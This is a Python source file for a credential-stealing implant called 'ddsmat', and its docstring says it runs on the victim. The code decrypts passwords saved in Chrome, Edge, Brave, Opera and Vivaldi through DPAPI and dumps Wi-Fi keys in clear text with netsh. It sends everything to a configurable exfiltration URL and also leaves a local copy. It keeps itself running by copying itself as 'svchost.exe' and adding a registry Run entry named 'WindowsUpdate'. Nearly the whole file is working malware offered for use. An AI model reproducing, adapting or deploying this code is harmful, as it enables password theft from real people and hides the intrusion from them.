# ddsmat/implant.py
"""
ddsmat implant.

Runs on the victim. Steals credentials, tries to exfil to the URL in
config.json. If no URL is set, writes a local file next to itself.

Config is injected at build time by builds.py from config.json:
    {
      "exfil_url":   "",
      "exfil_token": "",
      "persist":     true
    }
"""
import os
import sys
import io
import json
import time
import base64
import socket
import platform
import subprocess
import tempfile
import threading
import sqlite3
import shutil
from pathlib import Path
from urllib.request import Request, urlopen

CONFIG_JSON = {}


# ------------------------------------------------------------------
def _post(url, token, payload: dict):
    try:
        data = json.dumps(payload).encode()
        req = Request(url, data=data,
                      headers={"Content-Type": "application/json",
                               "X-Token": token})
        urlopen(req, timeout=15).read()
    except Exception:
        pass


def _dpapi_decrypt(blob: bytes) -> bytes:
    import ctypes
    import ctypes.wintypes as wt

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [("cbData", wt.DWORD),
                    ("pbData", ctypes.POINTER(ctypes.c_char))]

    crypt32  = ctypes.windll.crypt32
    kernel32 = ctypes.windll.kernel32

    bin_blob = DATA_BLOB(len(blob),
                ctypes.cast(ctypes.create_string_buffer(blob),
                            ctypes.POINTER(ctypes.c_char)))
    out_blob = DATA_BLOB()
    if not crypt32.CryptUnprotectData(ctypes.byref(bin_blob), None, None,
                                      None, None, 0, ctypes.byref(out_blob)):
        raise OSError("CryptUnprotectData failed")
    data = ctypes.string_at(out_blob.pbData, out_blob.cbData)
    kernel32.LocalFree(out_blob.pbData)
    return data


def _browsers_windows():
    local = os.environ.get("LOCALAPPDATA", "")
    roaming = os.environ.get("APPDATA", "")
    targets = [
        ("Chrome",  Path(local)   / "Google/Chrome/User Data"),
        ("Edge",    Path(local)   / "Microsoft/Edge/User Data"),
        ("Brave",   Path(local)   / "BraveSoftware/Brave-Browser/User Data"),
        ("Opera",   Path(roaming) / "Opera Software/Opera Stable"),
        ("Vivaldi", Path(local)   / "Vivaldi/User Data"),
    ]
    for name, base in targets:
        if not base.exists():
            continue
        for profile in list(base.glob("Default")) + list(base.glob("Profile *")):
            db = profile / "Login Data"
            if db.exists():
                yield name, db


def _chromium_passwords(db_path: Path):
    tmp = Path(tempfile.gettempdir()) / f"ld_{os.getpid()}_{db_path.parent.name}.db"
    try:
        shutil.copy2(db_path, tmp)
    except Exception:
        return []
    results = []
    try:
        con = sqlite3.connect(str(tmp))
        cur = con.cursor()
        cur.execute("SELECT origin_url, username_value, password_value FROM logins")
        for url, user, pw_blob in cur.fetchall():
            if not pw_blob:
                continue
            try:
                pw = _dpapi_decrypt(pw_blob).decode(errors="replace")
            except Exception:
                pw = "(dpapi fail)"
            results.append({"url": url, "user": user, "password": pw})
        con.close()
    except Exception:
        pass
    try:
        tmp.unlink()
    except Exception:
        pass
    return results


def _wifi_windows():
    out = []
    try:
        p = subprocess.run(["netsh", "wlan", "show", "profiles"],
                           capture_output=True, text=True, timeout=20)
        for line in p.stdout.splitlines():
            if "All User Profile" in line:
                ssid = line.split(":", 1)[1].strip()
                r = subprocess.run(
                    ["netsh", "wlan", "show", "profile", f"name={ssid}", "key=clear"],
                    capture_output=True, text=True, timeout=15)
                key = ""
                for l in r.stdout.splitlines():
                    if "Key Content" in l:
                        key = l.split(":", 1)[1].strip(); break
                out.append({"ssid": ssid, "key": key})
    except Exception:
        pass
    return out


def collect():
    sysname = platform.system()
    data = {
        "host":   socket.gethostname(),
        "os":     f"{sysname} {platform.release()}",
        "user":   os.environ.get("USERNAME") or os.environ.get("USER", "?"),
        "time":   int(time.time()),
        "passwords": [],
        "wifi":      [],
    }
    if sysname == "Windows":
        for bname, db in _browsers_windows():
            for c in _chromium_passwords(db):
                c["browser"] = bname
                data["passwords"].append(c)
        data["wifi"] = _wifi_windows()
    return data


# ------------------------------------------------------------------
def persist_windows():
    try:
        me = sys.executable if getattr(sys, "frozen", False) else __file__
        ap = Path(os.environ["APPDATA"]) / "ddsmat"
        ap.mkdir(exist_ok=True)
        dst = ap / "svchost.exe"
        shutil.copy2(me, dst)
        import winreg
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                           r"Software\Microsoft\Windows\CurrentVersion\Run",
                           0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "WindowsUpdate", 0, winreg.REG_SZ, str(dst))
        winreg.CloseKey(k)
    except Exception:
        pass


# ------------------------------------------------------------------
def main():
    cfg = CONFIG_JSON or {}
    data = collect()

    url   = cfg.get("exfil_url")
    token = cfg.get("exfil_token", "")
    if url:
        _post(url, token, data)

    try:
        side = Path(tempfile.gettempdir()) / "ddsmat_out.json"
        side.write_text(json.dumps(data, indent=2))
    except Exception:
        pass

    if cfg.get("persist"):
        try:
            if platform.system() == "Windows":
                persist_windows()
        except Exception:
            pass


if __name__ == "__main__":
    try:
        main()
    except Exception:
        pass
